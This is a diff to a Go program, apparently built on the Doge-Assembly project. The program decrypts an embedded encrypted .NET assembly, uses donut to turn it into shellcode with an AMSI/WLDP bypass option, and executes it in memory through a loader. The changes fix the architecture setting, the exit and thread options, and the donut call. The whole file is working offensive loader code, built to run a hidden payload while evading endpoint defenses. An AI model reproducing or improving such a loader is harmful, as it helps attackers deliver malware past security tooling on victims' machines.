@@ -8,8 +8,8 @@ import (
 	"strconv"
 	"strings"
 
-	"github.com/timwhitez/Doge-Assembly/loader"
 	"github.com/timwhitez/Doge-Assembly/donut"
+	"github.com/timwhitez/Doge-Assembly/loader"
 )
 
 var Version string
@@ -50,10 +50,10 @@ func main() {
 	entropy := 3
 
 	//  -PIC/SHELLCODE OPTIONS-
-	archStr := "x84"
+	archStr := "x64"
 	bypass := 3
 	format := 1
-	action := 2
+	action := 1
 
 	//  -FILE OPTIONS-
 
@@ -97,6 +97,7 @@ func main() {
 	config.Bypass = bypass
 	config.Compress = uint32(zFlag)
 	config.Format = uint32(format)
+	config.Thread = 1
 
 	config.ExitOpt = uint32(action)
 
@@ -105,15 +106,18 @@ func main() {
 		panic(err)
 	}
 	assemblyBytesci, er := Asset("data/sharp.exe.cipher")
-
 	if er != nil {
 		panic(er)
 	}
+
+	/*
 	version, er := Asset("data/version.txt")
+
+	 */
 
 	assemblyBytes := decrypt(assemblyBytesci,key)
 
-	payload, err := donut.ShellcodeFromFile(string(version), config, assemblyBytes)
+	payload, err := donut.ShellcodeFromFile(config, assemblyBytes)
 	if err == nil {
 		b := payload.Bytes()
 		loader.Load(b)
